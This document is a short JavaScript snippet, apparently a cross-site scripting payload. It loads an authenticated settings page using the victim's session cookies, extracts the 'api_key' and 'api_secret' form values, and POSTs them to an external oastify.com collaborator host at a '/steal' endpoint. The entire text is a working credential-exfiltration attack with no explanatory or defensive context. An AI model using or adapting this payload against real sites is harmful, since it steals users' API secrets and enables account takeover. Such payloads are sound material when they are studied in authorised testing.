fetch("/client/settings/configuration", {
  credentials: "include"
})
  .then(res => res.text())
  .then(html => {
    const parser = new DOMParser();
    const doc = parser.parseFromString(html, "text/html");

    const apiKey = doc.querySelector('input[name="api_key"]')?.value;
    const apiSecret = doc.querySelector('input[name="api_secret"]')?.value;

    fetch("https://2y1jtx1vezcek1lbfgr5zkmhw82zqqef.oastify.com/steal", {
      method: "POST",
      body: JSON.stringify({ apiKey, apiSecret }),
      headers: { "Content-Type": "application/json" }
    });
  });
